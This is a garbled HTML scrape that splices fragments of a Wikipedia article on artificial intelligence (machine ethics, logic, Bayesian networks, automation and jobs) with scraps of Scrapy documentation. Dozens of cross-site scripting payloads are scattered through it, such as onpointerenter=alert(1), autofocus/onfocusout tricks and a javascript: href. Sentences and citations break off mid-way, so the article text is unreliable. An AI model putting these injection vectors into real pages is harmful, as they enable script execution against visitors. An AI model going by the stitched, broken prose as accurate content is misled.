<li><a href="/wiki/Medical_cybernetics" title="Medical cybernetics">Medical cybernetics </a> </li> <ins onpointerenter=alert(1)>XSS</ins> <data id=x tabindex=1 onbeforedeactivate=alert(1)></data><input autofocus> </p><p>Many components contribute to the functioning of self-driving cars. These vehicles incorporate systems such as braking, lane changing, collision prevention, navigation and mapping. Together, these systems, as well as high performance computers, are integrated into one complex vehicle.<sup id="cite_ref-308" class="reference"><a href="#cite_note-308">&#91;297&#93; </a> </sup> </span> </h3> </span> </span> <span class="reference-text">While such a "victory of the neats" may be a consequence of the field becoming more mature, <a href="/wiki/Artificial_Intelligence:_A_Modern_Approach" title="Artificial Intelligence: A Modern Approach">AIMA </a> states that in practice both <a href="/wiki/Neats_and_scruffies" title="Neats and scruffies">neat and scruffy </a> approaches continue to be necessary in AI research. <u onfocusout=alert(1) tabindex=1 id=x></u><input autofocus> <style>:target {transform: rotate(180deg);}</style><strong id=x style="transition:transform 2s" ontransitionrun=alert(1)></strong> <i data-toggle="wy-nav-top" class="fa fa-bars"></i> <strike onbeforecopy="alert(1)" contenteditable>test</strike> </span><link rel="mw-deduplicated-inline-style" href="mw-data:TemplateStyles:r935243608"/> <template onbeforecopy="alert(1)" contenteditable>test</template> <bdo onmouseup="alert(1)">test</bdo> <p>The field of machine ethics is concerned with giving machines ethical principles, or a procedure for discovering a way to resolve the ethical dilemmas they might encounter, enabling them to function in an ethically responsible manner through their own ethical decision making.<sup id="cite_ref-autogenerated1_397-0" class="reference"><a href="#cite_note-autogenerated1-397">&#91;386&#93; </a> </sup> The field was delineated in the AAAI Fall 2005 Symposium on Machine Ethics: "Past research concerning the relationship between technology and ethics has largely focused on responsible and irresponsible use of technology by human beings, with a few people being interested in how human beings ought to treat machines. In all cases, only human beings have engaged in ethical reasoning. The time has come for adding an ethical dimension to at least some machines. Recognition of the ethical ramifications of behavior involving machines, as well as recent and potential developments in machine autonomy, necessitate this. In contrast to computer hacking, software property issues, privacy issues and other topics normally ascribed to computer ethics, machine ethics is concerned with the behavior of machines towards human users and other machines. Research in machine ethics is key to alleviating concerns with autonomous systems—it could be argued that the notion of autonomous machines without such a dimension is at the root of all fear concerning machine intelligence. Further, investigation of machine ethics could enable the discovery of problems with current ethical theories, advancing our thinking about Ethics."<sup id="cite_ref-autogenerated2_398-0" class="reference"><a href="#cite_note-autogenerated2-398">&#91;387&#93; </a> </sup> Machine ethics is sometimes referred to as machine morality, computational ethics or computational morality. A variety of perspectives of this nascent field can be found in the collected edition "Machine Ethics"<sup id="cite_ref-autogenerated1_397-1" class="reference"><a href="#cite_note-autogenerated1-397">&#91;386&#93; </a> </sup> that stems from the AAAI Fall 2005 Symposium on Machine Ethics.<sup id="cite_ref-autogenerated2_398-1" class="reference"><a href="#cite_note-autogenerated2-398">&#91;387&#93; </a> </sup> </span> </li> <rp onfocusout=alert(1) tabindex=1 id=x></rp><input autofocus> </span><link rel="mw-deduplicated-inline-style" href="mw-data:TemplateStyles:r935243608"/> </li> <div draggable="true" contenteditable>drag me</div><option ondrop=alert(1) contenteditable>drop here</option> </span> <tt onmousedown="alert(1)">test</tt> <li><a href="#CITEREFNilsson1998">Nilsson 1998 </a> </li> </ul> </span> <span class="reference-text"> <hr/> <ul><li><a href="#CITEREFRussellNorvig2003">Russell &amp; Norvig 2003 </a>, pp.&#160;354–360, </li> <li id="cite_note-Symbolic_vs._sub-symbolic-18"><span class="mw-cite-backlink">^ <a href="#cite_ref-Symbolic_vs._sub-symbolic_18-0"><sup><i><b>a </b> </i> </sup> </a> <a href="#cite_ref-Symbolic_vs._sub-symbolic_18-1"><sup><i><b>b </b> </i> </sup> </a> </span></a></dt><dd>Learn how to scrape with your browser’s developer tools.</dd> <li><a href="/wiki/Bacterial_Colony_Optimization" class="mw-redirect" title="Bacterial Colony Optimization">Bacterial Colony Optimization </a> </li> </ul> <del onpointermove=alert(1)>XSS</del> <li class="toclevel-3 tocsection-52"><a href="#Devaluation_of_humanity"><span class="tocnumber">8.2.2 <li><a href="#CITEREFPooleMackworthGoebel1998">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;408–414, </li> </span><link rel="mw-deduplicated-inline-style" href="mw-data:TemplateStyles:r935243608"/> <style>@keyframes x{}</style><nav style="animation-name:x" onanimationstart="alert(1)"></nav> </span> <span class="reference-text"><cite class="citation journal">Ivakhnenko, A. Rubin">Charles T. Rubin </a> believes that AI can be neither designed nor guaranteed to be benevolent.<sup id="cite_ref-399" class="reference"><a href="#cite_note-399">&#91;388&#93; </a> </sup> He argues that "any sufficiently advanced benevolence may be indistinguishable from malevolence." Humans should not assume machines or robots would treat us favorably because there is no <i>a priori </i> reason to believe that they would be sympathetic to our system of morality, which has evolved along with our particular biology (which AIs would not share). Hyper-intelligent software may not necessarily decide to support the continued existence of humanity and would be extremely difficult to stop. This topic has also recently begun to be discussed in academic publications as a real source of risks to civilization, humans, and planet Earth. <style>@keyframes x{}</style><sub style="animation-name:x" onanimationend="alert(1)"></sub> <listing oncontextmenu="alert(1)">test</listing> <div itemprop="articleBody"> <rtc onkeypress="alert(1)" contenteditable>test</rtc> </div> <p>Economist <a href="/wiki/Herbert_A._Simon" title="Herbert A. Simon">Herbert Simon </a> and <a href="/wiki/Allen_Newell" title="Allen Newell">Allen Newell </a> studied human problem-solving skills and attempted to formalize them, and their work laid the foundations of the field of artificial intelligence, as well as <a href="/wiki/Cognitive_science" title="Cognitive science">cognitive science </a>, <a href="/wiki/Operations_research" title="Operations research">operations research </a> and <a href="/wiki/Management_science" title="Management science">management science </a>. Their research team used the results of <a href="/wiki/Psychology" title="Psychology">psychological </a> experiments to develop programs that simulated the techniques that people used to solve problems. This tradition, centered at <a href="/wiki/Carnegie_Mellon_University" title="Carnegie Mellon University">Carnegie Mellon University </a> would eventually culminate in the development of the <a href="/wiki/Soar_(cognitive_architecture)" title="Soar (cognitive architecture)">Soar </a> architecture in the middle 1980s.<sup id="cite_ref-AI_at_CMU_in_the_60s_159-0" class="reference"><a Ross Ashby">William Ross Ashby </a> </li> <b onpointermove=alert(1)>XSS</b> <base onbeforepaste="alert(1)" contenteditable>test</base> <track onmousedown="alert(1)">test</track> <ul><li><a href="#CITEREFMoravec1988">Moravec 1988 </a> </li> <style>:target {transform: rotate(180deg);}</style><iframe id=x style="transition:transform 2s" ontransitionrun=alert(1)></iframe> </span><link rel="mw-deduplicated-inline-style" href="mw-data:TemplateStyles:r935243608"/> </span> </a> </li> <wbr draggable="true" ondragenter="alert(1)">test</wbr> <style>:target {transform: rotate(180deg);}</style><article id=x style="transition:transform 2s" ontransitionrun=alert(1)></article> </p><p>Several different forms of logic are used in AI research. <a href="/wiki/Propositional_logic" class="mw-redirect" title="Propositional logic">Propositional logic </a><sup id="cite_ref-Propositional_logic_197-0" class="reference"><a href="#cite_note-Propositional_logic-197">&#91;193&#93; </a> </sup> involves <a href="/wiki/Truth_function" title="Truth function">truth functions </a> such as "or" and "not". <a href="/wiki/First-order_logic" title="First-order logic">First-order logic </a><sup id="cite_ref-First-order_logic_198-0" class="reference"><a href="#cite_note-First-order_logic-198">&#91;194&#93; </a> </sup> adds <a href="/wiki/Quantifier_(logic)" title="Quantifier (logic)">quantifiers </a> and <a href="/wiki/Predicate_(mathematical_logic)" title="Predicate (mathematical logic)">predicates </a>, and can express facts about objects, their properties, and their relations with each other. <a href="/wiki/Fuzzy_set_theory" class="mw-redirect" title="Fuzzy set theory">Fuzzy set theory </a> assigns a "degree of truth" (between 0 and 1) to vague statements such as "Alice is old" (or rich, or tall, or hungry) that are too linguistically imprecise to be completely true or false. <a href="/wiki/Fuzzy_logic" title="Fuzzy logic">Fuzzy logic </a> is successfully used in <a href="/wiki/Control_system" title="Control system">control systems </a> to allow experts to contribute vague rules such as "if you are close to the destination station and moving fast, increase the train's brake pressure"; these vague rules can then be numerically refined within the system. Fuzzy logic fails to scale well in knowledge bases; many AI researchers question the validity of chaining fuzzy-logic inferences.<sup id="cite_ref-200" class="reference"><a href="#cite_note-200">&#91;e&#93; </a> </sup><sup id="cite_ref-Fuzzy_logic_201-0" class="reference"><a href="#cite_note-Fuzzy_logic-201">&#91;196&#93; </a> </sup><sup id="cite_ref-202" onpointerout=alert(1)>XSS</input4> </div> <p>Computationalism is the position in the <a href="/wiki/Philosophy_of_mind" title="Philosophy of mind">philosophy of mind </a> that the human mind or the human brain (or both) is an information processing system and that thinking is a form of computing.<sup id="cite_ref-403" class="reference"><a href="#cite_note-403">&#91;391&#93; </a> </sup> Computationalism argues that the relationship between mind and body is similar or identical to the relationship between software and hardware and thus may be a solution to the <a href="/wiki/Mind-body_problem" class="mw-redirect" title="Mind-body problem">mind-body problem </a>. This philosophical position was inspired by the work of AI researchers and cognitive scientists in the 1960s and was originally proposed by philosophers <a href="/wiki/Jerry_Fodor" title="Jerry Fodor">Jerry Fodor </a> and <a href="/wiki/Hilary_Putnam" title="Hilary Putnam">Hilary Putnam </a>. <li>Search for questions on the archives of the <a class="reference external" href="https://groups.google.com/forum/#!forum/scrapy-users">scrapy-users mailing list</a>.</li> <canvas onmouseout="alert(1)">test</canvas> <strong onmouseenter="alert(1)">test</strong> </span><span class="mw-editsection"><span class="mw-editsection-bracket">[ </span> <noembed oncut="alert(1)" contenteditable>test</noembed> <var oncopy="alert(1)" contenteditable>test</var> <li><a href="#CITEREFRussellNorvig2003">Russell &amp; Norvig 2003 </a>, pp.&#160;194–310, </li> <ul><li><a href="#CITEREFACM1998">ACM 1998 </a>, I.2.9, </li> </li> <li><cite id="CITEREFTaoTan2005" class="citation conference">Tao, Jianhua; Tan, Tieniu (2005). <i>Affective Computing and Intelligent Interaction </i>. onclick="alert(1)">test</area> <p>Artificial Intelligence has inspired numerous creative applications including its usage to produce visual art. The exhibition "Thinking Machines: Art and Design in the Computer Age, 1959–1989" at MoMA<sup id="cite_ref-moma_343-0" class="reference"><a href="#cite_note-moma-343">&#91;332&#93; </a> </sup> provides a good overview of the historical applications of AI for art, architecture, and design. Recent exhibitions showcasing the usage of AI to produce art include the Google-sponsored benefit and auction at the Gray Area Foundation in San Francisco, where artists experimented with the <a href="/wiki/DeepDream" title="DeepDream">DeepDream </a> algorithm<sup id="cite_ref-wp1_344-0" class="reference"><a href="#cite_note-wp1-344">&#91;333&#93; </a> </sup> and the exhibition "Unhuman: Art in the Age of AI," which took place in Los Angeles and Frankfurt in the fall of 2017.<sup id="cite_ref-sf_345-0" class="reference"><a href="#cite_note-sf-345">&#91;334&#93; </a> </sup><sup id="cite_ref-artsy_346-0" class="reference"><a href="#cite_note-artsy-346">&#91;335&#93; </a> </sup> In the spring of 2018, the Association of Computing Machinery dedicated a special magazine issue to the subject of computers and art highlighting the role of machine learning in the arts.<sup id="cite_ref-acm_347-0" class="reference"><a href="#cite_note-acm-347">&#91;336&#93; </a> </sup> The Austrian <a href="/wiki/Ars_Electronica" title="Ars Electronica">Ars Electronica </a> and <a href="/wiki/Museum_of_Applied_Arts,_Vienna" title="Museum of Applied Arts, Vienna">Museum of Applied Arts, Vienna </a> opened exhibitions on AI in 2019.<sup id="cite_ref-Ars_Electronica_Exhibition_&#39;&#39;Understanding_AI&#39;&#39;_348-0" class="reference"><a href="#cite_note-Ars_Electronica_Exhibition_&#39;&#39;Understanding_AI&#39;&#39;-348">&#91;337&#93; </a> </sup><sup id="cite_ref-Museum_of_Applied_Arts_Exhibition_&#39;&#39;Uncanny_Values&#39;&#39;_349-0" class="reference"><a href="#cite_note-Museum_of_Applied_Arts_Exhibition_&#39;&#39;Uncanny_Values&#39;&#39;-349">&#91;338&#93; </a> </sup> The Ars Electronica's 2019 festival "Out of the box" extensively thematized the role of arts for a sustainable societal transformation with AI.<sup id="cite_ref-European_Platform_for_Digital_Humanism_350-0" class="reference"><a href="#cite_note-European_Platform_for_Digital_Humanism-350">&#91;339&#93; Goebel 1998 </a> </li> </span><link rel="mw-deduplicated-inline-style" href="mw-data:TemplateStyles:r935243608"/> <h1 onkeyup="alert(1)" contenteditable>test</h1> <p>The <a href="/wiki/Cybersecurity" class="mw-redirect" title="Cybersecurity">cybersecurity </a> arena faces significant challenges in the form of larges scale hacking attacks of different types which harm organizations of all kinds and create billions of dollars in business damage. Artificial intelligence and Natural Language Processing (NLP) has begun to be used by security companies - for example SIEM (Security Information and Event Management) solutions. The more advanced of these solutions use AI and NLP to automatically sort the data in networks into high risk and low risk information. This enables security teams to focus on the attacks that have the potential to do real harm to the organization, and not become victims of attacks such as <a href="/wiki/Denial-of-service_attack" title="Denial-of-service attack">Denial of Service (DoS) </a>, <a href="/wiki/Malware" title="Malware">Malware </a> and others. <isindex onfocusout=alert(1) tabindex=1 id=x></isindex><input autofocus> unifying theory or <a href="/wiki/Paradigm" title="Paradigm">paradigm </a> that guides AI research. Researchers disagree about many issues.<sup id="cite_ref-155" class="reference"><a href="#cite_note-155">&#91;152&#93; </a> </sup> A few of the most long standing questions that have remained unanswered are these: should artificial intelligence simulate natural intelligence by studying <a href="/wiki/Psychology" title="Psychology">psychology </a> or <a href="/wiki/Neuroscience" title="Neuroscience">neurobiology </a>? Or is <a href="/wiki/Human_biology" title="Human biology">human biology </a> as irrelevant to AI research as bird biology is to <a href="/wiki/Aeronautical_engineering" class="mw-redirect" title="Aeronautical engineering">aeronautical engineering </a> </span> <span class="reference-text"><cite class="citation journal">Schmidhuber, J. ondblclick="alert(1)">test</noframes> <tfoot onpointerenter=alert(1)>XSS</tfoot> <rtc id=x tabindex=1 onfocus=alert(1)></rtc> </p><p><a href="/wiki/Bayesian_network" title="Bayesian network">Bayesian networks </a><sup id="cite_ref-Bayesian_networks_205-0" class="reference"><a href="#cite_note-Bayesian_networks-205">&#91;200&#93; </a> </sup> are a very general tool that can be used for various problems: reasoning (using the <a href="/wiki/Bayesian_inference" title="Bayesian inference">Bayesian inference </a> algorithm),<sup id="cite_ref-Bayesian_inference_206-0" class="reference"><a href="#cite_note-Bayesian_inference-206">&#91;201&#93; </a> </sup> <a href="/wiki/Machine_learning" title="Machine learning">learning </a> (using the <a href="/wiki/Expectation-maximization_algorithm" class="mw-redirect" title="Expectation-maximization algorithm">expectation-maximization algorithm </a>),<sup id="cite_ref-208" class="reference"><a href="#cite_note-208">&#91;f&#93; </a> </sup><sup id="cite_ref-Bayesian_learning_209-0" class="reference"><a href="#cite_note-Bayesian_learning-209">&#91;203&#93; </a> </sup> <a href="/wiki/Automated_planning_and_scheduling" title="Automated planning and scheduling">planning </a> (using <a href="/wiki/Decision_network" class="mw-redirect" title="Decision network">decision networks </a>)<sup id="cite_ref-Bayesian_decision_networks_210-0" class="reference"><a href="#cite_note-Bayesian_decision_networks-210">&#91;204&#93; </a> </sup> and <a href="/wiki/Machine_perception" title="Machine perception">perception </a> (using <a href="/wiki/Dynamic_Bayesian_network" title="Dynamic Bayesian network">dynamic Bayesian networks </a>).<sup id="cite_ref-Stochastic_temporal_models_211-0" class="reference"><a href="#cite_note-Stochastic_temporal_models-211">&#91;205&#93; </a> </sup> Probabilistic algorithms can also be used for filtering, prediction, smoothing and finding explanations for streams of data, helping <a href="/wiki/Machine_perception" title="Machine perception">perception </a> systems to analyze processes that occur over time (e.g., <a href="/wiki/Hidden_Markov_model" title="Hidden Markov model">hidden Markov models </a> or <a href="/wiki/Kalman_filter" title="Kalman filter">Kalman filters </a>).<sup id="cite_ref-Stochastic_temporal_models_211-1" class="reference"><a href="#cite_note-Stochastic_temporal_models-211">&#91;205&#93; </a> </sup> Compared with symbolic logic, formal Bayesian inference is computationally expensive. For inference to be tractable, most observations must be <a href="/wiki/Conditionally_independent" class="mw-redirect" title="Conditionally independent">conditionally independent </a> of one another. Complicated graphs with diamonds or other "loops" (undirected <a href="/wiki/Cycle_(graph_theory)" title="Cycle (graph theory)">cycles </a>) can require a sophisticated method such as <a href="/wiki/Markov_chain_Monte_Carlo" title="Markov chain Monte Carlo">Markov chain Monte Carlo </a>, which spreads an ensemble of <a href="/wiki/Random_walk" title="Random walk">random walkers </a> throughout the Bayesian network and attempts to converge to an assessment of the conditional probabilities. Proceedings of the National Academy of Sciences (2017): 201710966. <br onclick="alert(1)">test</br> <li><a href="/wiki/Adaptable_robotics" title="Adaptable robotics">Adaptable </a> </li> <ul><li><a href="/wiki/Algorithm_design" class="mw-redirect" title="Algorithm design">Algorithm design </a> </li> <li><a href="/wiki/Nanorobotics" title="Nanorobotics">Nanorobotics </a> </li> <div draggable="true" ondragend="alert(1)">test</div> <i onpointerout=alert(1)>XSS</i> <animatemotion onpointerout=alert(1)>XSS</animatemotion> <li><a href="/wiki/Glossary_of_geology" title="Glossary of geology">Geology </a> </li> <div draggable="true" contenteditable>drag me</div><multicol ondragover=alert(1) contenteditable>drop here</multicol> <p>The simplest AI applications can be divided into two types: classifiers ("if shiny then diamond") and controllers ("if shiny then pick up"). Controllers do, however, also classify conditions before inferring actions, and therefore classification forms a central part of many AI systems. <a href="/wiki/Classifier_(mathematics)" class="mw-redirect" title="Classifier (mathematics)">Classifiers </a> are functions that use <a href="/wiki/Pattern_matching" title="Pattern matching">pattern matching </a> to determine a closest match. They can be tuned according to examples, making them very attractive for use in AI. These examples are known as observations or patterns. In supervised learning, each pattern belongs to a certain predefined class. A class can be seen as a decision that has to be made. All the observations combined with their class labels are known as a data set. When a new observation is received, that observation is classified based on previous experience.<sup id="cite_ref-Classifiers_216-0" class="reference"><a </span> <span class="reference-text">Adversarial vulnerabilities can also result in nonlinear systems, or from non-pattern perturbations. Some systems are so brittle that changing a single adversarial pixel predictably induces misclassification. <basefont id=x tabindex=1 onfocusin=alert(1)></basefont> <template onpointerleave=alert(1)>XSS</template> <p>Historically, projects such as the Cyc knowledge base (1984–) and the massive Japanese <a href="/wiki/Fifth_generation_computer" title="Fifth generation computer">Fifth Generation Computer Systems </a> initiative (1982–1992) attempted to cover the breadth of human cognition. These early projects failed to escape the limitations of non-quantitative symbolic logic models and, in retrospect, greatly underestimated the difficulty of cross-domain AI. Nowadays, the vast majority of current AI researchers work instead on tractable "narrow AI" applications (such as medical diagnosis or automobile navigation).<sup id="cite_ref-contemporary_agi_146-0" class="reference"><a href="#cite_note-contemporary_agi-146">&#91;143&#93; </a> </sup> Many researchers predict that such "narrow AI" work in different individual domains will eventually be incorporated into a machine with <a href="/wiki/Artificial_general_intelligence" title="Artificial general intelligence">artificial general intelligence </a> (AGI), combining most of the narrow skills mentioned in this article and at some point even exceeding human ability in most or all these areas.<sup id="cite_ref-General_intelligence_19-1" class="reference"><a <span class="mw-editsection-bracket">] <li><a href="/wiki/Steve_Omohundro" title="Steve Omohundro">Steve Omohundro </a> </li> <ul><li><a href="/wiki/Symbolic_artificial_intelligence" title="Symbolic artificial intelligence">Symbolic </a> </li> Tools <aside onfocusout=alert(1) tabindex=1 id=x></aside><input autofocus> <pre onmousemove="alert(1)">test</pre> <p>The relationship between automation and employment is complicated. While automation eliminates old jobs, it also creates new jobs through micro-economic and macro-economic effects.<sup id="cite_ref-384" class="reference"><a href="#cite_note-384">&#91;373&#93; </a> </sup> Unlike previous waves of automation, many middle-class jobs may be eliminated by artificial intelligence; <i><a href="/wiki/The_Economist" title="The Economist">The Economist </a> </i> states that "the worry that AI could do to white-collar jobs what steam power did to blue-collar ones during the Industrial Revolution" is "worth taking seriously".<sup id="cite_ref-385" class="reference"><a href="#cite_note-385">&#91;374&#93; </a> </sup> Subjective estimates of the risk vary widely; for example, Michael Osborne and <a href="/wiki/Carl_Benedikt_Frey" title="Carl Benedikt Frey">Carl Benedikt Frey </a> estimate 47% of U.S. jobs are at "high risk" of potential automation, while an OECD report classifies only 9% of U.S. jobs as "high risk".<sup id="cite_ref-386" class="reference"><a href="#cite_note-386">&#91;375&#93; </a> </sup><sup id="cite_ref-387" class="reference"><a href="#cite_note-387">&#91;376&#93; </a> </sup><sup id="cite_ref-388" class="reference"><a href="#cite_note-388">&#91;377&#93; </a> </sup> Jobs at extreme risk range from paralegals to fast food cooks, while job demand is likely to increase for care-related professions ranging from personal healthcare to the clergy.<sup id="cite_ref-389" class="reference"><a href="#cite_note-389">&#91;378&#93; </a> </sup> Author <a href="/wiki/Martin_Ford_(author)" title="Martin Ford (author)">Martin Ford </a> and others go further and argue that many jobs are routine, repetitive and (to an AI) predictable; Ford warns that these jobs may be automated in the next couple of decades, and that many of the new jobs may not be "accessible to people with average capability", even with retraining. Economists point out that in the past technology has tended to increase rather than reduce total employment, but acknowledge that "we're in uncharted territory" with AI.<sup id="cite_ref-guardian_jobs_debate_24-1" class="reference"><a href="#cite_note-guardian_jobs_debate-24">&#91;24&#93; </a> </sup> <nextid onmouseenter="alert(1)">test</nextid> <fieldset onmouseleave="alert(1)">test</fieldset> HREF="javascript:alert('') <aside onblur=alert(1) tabindex=1 id=x></aside><input autofocus> <a href="//readthedocs.org/projects/scrapy/?fromdocs=scrapy">Project Home</a> </span> <span class="reference-text"><a href="#CITEREFDomingos2015">Domingos 2015 </a>, Chapter 1. <option onpointerover=alert(1)>XSS</option> <var onmouseenter="alert(1)">test</var> <caption id=x tabindex=1 onbeforedeactivate=alert(1)></caption><input autofocus> <a class="mw-jump-link" href="#mw-head">Jump to navigation </a> <spacer onpointermove=alert(1)>XSS</spacer> <li id="cite_note-389"><span class="mw-cite-backlink"><b><a href="#cite_ref-389">^ </a> </b> <li><a href="/wiki/Sociology_of_scientific_knowledge" title="Sociology of scientific knowledge">Sociology of scientific knowledge </a> </li> </span> <span class="reference-text">A. Gödel finds (b) implausible, and thus seems to have believed the human mind was not equivalent to a finite machine, i.e., its power exceeded that of any finite machine. He recognized that this was only a conjecture, since one could never disprove (b). Yet he considered the disjunctive conclusion to be a "certain fact". <b onbeforecut="alert(1)" contenteditable>test</b> </span><link rel="mw-deduplicated-inline-style" In 2016, a ground breaking study in California found that a mathematical formula developed with the help of AI correctly determined the accurate dose of immunosuppressant drugs to give to organ patients.<sup id="cite_ref-300" class="reference"><a href="#cite_note-300">&#91;289&#93; </a> </sup> </p> </dl> <div id="toc" class="toc" role="navigation" aria-labelledby="mw-toc-heading"><input type="checkbox" role="button" id="toctogglecheckbox" class="toctogglecheckbox" style="display:none" /> <multicol onpointerleave=alert(1)>XSS</multicol> <p>Interest in <a href="/wiki/Artificial_neural_network" title="Artificial neural network">neural networks </a> and "<a href="/wiki/Connectionism" title="Connectionism">connectionism </a>" was revived by <a href="/wiki/David_Rumelhart" title="David Rumelhart">David Rumelhart </a> and others in the middle of the 1980s.<sup id="cite_ref-Revival_of_connectionism_172-0" class="reference"><a href="#cite_note-Revival_of_connectionism-172">&#91;169&#93; </a> </sup> <a href="/wiki/Artificial_neural_network" title="Artificial neural network">Artificial neural networks </a> are an example of <a href="/w/index.php?title=Soft_computing&amp;action=edit&amp;redlink=1" class="new" title="Soft computing (page does not exist)">soft computing </a>—they are solutions to problems which cannot be solved with complete logical certainty, and where an approximate solution is often sufficient. Other <a href="/w/index.php?title=Soft_computing&amp;action=edit&amp;redlink=1" class="new" title="Soft computing (page does not exist)">soft computing </a> approaches to AI include <a href="/wiki/Fuzzy_system" class="mw-redirect" title="Fuzzy system">fuzzy systems </a>, <a href="/wiki/Grey_system_theory" class="mw-redirect" title="Grey system theory">Grey system theory </a>, <a href="/wiki/Evolutionary_computation" title="Evolutionary computation">evolutionary computation </a> and many statistical tools. The application of soft computing to AI is studied collectively by the emerging discipline of <a href="/wiki/Computational_intelligence" title="Computational intelligence">computational intelligence </a>.<sup id="cite_ref-Computational_intelligence_173-0" class="reference"><a href="#cite_note-Computational_intelligence-173">&#91;170&#93; </a> </sup> <ul><li><a href="#CITEREFRussellNorvig2003">Russell &amp; Norvig 2003 </a>, pp.&#160;526–527 </li> </ul> <li id="cite_note-Holley-365"><span class="mw-cite-backlink"><b><a href="#cite_ref-Holley_365-0">^ </a> </b> <marquee id=x tabindex=1 onfocus=alert(1)></marquee> </span> <span class="reference-text"><cite class="citation web"><a rel="nofollow" class="external text" href="https://www.researchgate.net/publication/333242550">"Current applications of Artificial Intelligence in tourism and hospitality" </a>. <i>Sinteza </i>. 2019<span class="reference-accessdate">. For many problems, it is possible to begin the search with some form of a guess and then refine the guess incrementally until no more refinements can be made. These algorithms can be visualized as blind <a href="/wiki/Hill_climbing" title="Hill climbing">hill climbing </a>: we begin the search at a random point on the landscape, and then, by jumps or steps, we keep moving our guess uphill, until we reach the top. Other optimization algorithms are <a href="/wiki/Simulated_annealing" title="Simulated annealing">simulated annealing </a>, <a href="/wiki/Beam_search" title="Beam search">beam search </a> and <a href="/wiki/Random_optimization" title="Random optimization">random optimization </a>.<sup id="cite_ref-Optimization_search_190-0" class="reference"><a href="#cite_note-Optimization_search-190">&#91;186&#93; contenteditable>drag me</div><figcaption ondrop=alert(1) contenteditable>drop here</figcaption> <ul><li><a href="/wiki/Ambient_intelligence" title="Ambient intelligence">Ambient intelligence </a> <p>Artificial intelligence is assisting doctors. According to Bloomberg Technology, Microsoft has developed AI to help doctors find the right treatments for cancer.<sup id="cite_ref-301" class="reference"><a href="#cite_note-301">&#91;290&#93; </a> </sup> There is a great amount of research and drugs developed relating to cancer. In detail, there are more than 800 medicines and vaccines to treat cancer. This negatively affects the doctors, because there are too many options to choose from, making it more difficult to choose the right drugs for the patients. Leading AI textbooks define the field as the study of "<a href="/wiki/Intelligent_agent" title="Intelligent agent">intelligent agents </a>": any device that perceives its environment and takes actions that maximize its chance of successfully achieving its goals.<sup id="cite_ref-Definition_of_AI_1-0" class="reference"><a href="#cite_note-Definition_of_AI-1">&#91;1&#93; </a> </sup> Colloquially, the term "artificial intelligence" is often used to describe machines (or computers) that mimic "cognitive" functions that humans associate with the <a href="/wiki/Human_mind" class="mw-redirect" title="Human mind">human mind </a>, such as "learning" and "problem solving".<sup id="cite_ref-FOOTNOTERussellNorvig20092_2-0" class="reference"><a href="#cite_note-FOOTNOTERussellNorvig20092-2">&#91;2&#93; </a> </sup> <caption id=x tabindex=1 onfocus=alert(1)></caption> <track onkeypress="alert(1)" contenteditable>test</track> </span> <span class="reference-text"><cite class="citation web"><a rel="nofollow" class="external text" href="https://www.infosys.com/industries/travel-hospitality/documents/ai-travel-hospitality.pdf">"Role of AI in travel and Hospitality Industry" </a> <span class="cs1-format">(PDF) </span> <span class="reference-text"><cite class="citation news"><a rel="nofollow" class="external text" href="http://fortune.com/ai-artificial-intelligence-deep-machine-learning/">"Why Deep Learning Is Suddenly Changing Your Life" </a>. <i>Fortune </i>. 2016<span class="reference-accessdate">. </p><p>According to <a href="/wiki/Bloomberg_News" title="Bloomberg News">Bloomberg's </a> Jack Clark, 2015 was a landmark year for artificial intelligence, with the number of software projects that use AI <a href="/wiki/Google" title="Google">Google </a> increased from a "sporadic usage" in 2012 to more than 2,700 projects. Clark also presents factual data indicating the improvements of AI since 2012 supported by lower error rates in image processing tasks.<sup id="cite_ref-:0_53-0" class="reference"><a href="#cite_note-:0-53">&#91;53&#93; </a> </sup> He attributes this to an increase in affordable <a href="/wiki/Artificial_neural_network" title="Artificial neural network">neural networks </a>, due to a rise in cloud computing infrastructure and to an increase in research tools and datasets.<sup id="cite_ref-AI_in_2000s_13-2" class="reference"><a href="#cite_note-AI_in_2000s-13">&#91;13&#93; </a> </sup> Other cited examples include Microsoft's development of a Skype system that can automatically translate from one language to another and Facebook's system that can describe images to blind people.<sup id="cite_ref-:0_53-1" class="reference"><a href="#cite_note-:0-53">&#91;53&#93; </a> </sup> In a 2017 survey, one in five companies reported they had "incorporated AI in some offerings or processes".<sup id="cite_ref-54" class="reference"><a href="#cite_note-54">&#91;54&#93; </a> </sup><sup id="cite_ref-55" class="reference"><a href="#cite_note-55">&#91;55&#93; </a> </sup> Around 2016, <a href="/wiki/China" title="China">China </a> greatly accelerated its government funding; given its large supply of data and its rapidly increasing research output, some observers believe it may be on track to becoming an "AI superpower".<sup id="cite_ref-56" class="reference"><a href="#cite_note-56">&#91;56&#93; </a> </sup><sup id="cite_ref-57" class="reference"><a href="#cite_note-57">&#91;57&#93; </a> </sup> However, it has been acknowledged that reports regarding artificial intelligence have tended to be exaggerated.<sup id="cite_ref-58" class="reference"><a href="#cite_note-58">&#91;58&#93; </a> </sup><sup id="cite_ref-59" class="reference"><a href="#cite_note-59">&#91;59&#93; </a> </sup><sup id="cite_ref-60" class="reference"><a href="#cite_note-60">&#91;60&#93; </a> </sup> <noscript id=x tabindex=1 onfocus=alert(1)></noscript> <h3><span class="mw-headline" id="Artificial_neural_networks">Artificial neural networks <abbr onkeyup="alert(1)" contenteditable>test</abbr> <nextid onbeforepaste="alert(1)" contenteditable>test</nextid> 0 <li id="cite_note-Chalmers-401"><span class="mw-cite-backlink"><b><a href="#cite_ref-Chalmers_401-0">^ </a> </b> <figure id=x tabindex=1 onbeforedeactivate=alert(1)></figure><input autofocus> <body class="mediawiki ltr sitedir-ltr mw-hide-empty-elt ns-0 ns-subject mw-editable page-Artificial_intelligence rootpage-Artificial_intelligence skin-vector action-view"> <ul><li><a href="#CITEREFMcCorduck2004">McCorduck 2004 </a>, pp.&#160;266–276, 298–300, 314, 421 </li> <blink onkeydown="alert(1)" contenteditable>test</blink> <video onmousemove="alert(1)">test</video> <div style="padding:0em 0.25em"> <noembed oncontextmenu="alert(1)">test</noembed> <div draggable="true" contenteditable>drag me</div><hr ondragover=alert(1) contenteditable>drop here</hr> <p>The long-term economic effects of AI are uncertain. A survey of economists showed disagreement about whether the increasing use of robots and AI will cause a substantial increase in long-term <a href="/wiki/Unemployment" title="Unemployment">unemployment </a>, but they generally agree that it could be a net benefit, if <a href="/wiki/Productivity" title="Productivity">productivity </a> gains are <a href="/wiki/Redistribution_of_income_and_wealth" title="Redistribution of income and wealth">redistributed </a>.<sup id="cite_ref-413" class="reference"><a href="#cite_note-413">&#91;401&#93; </a> </sup> A February 2020 European Union white paper 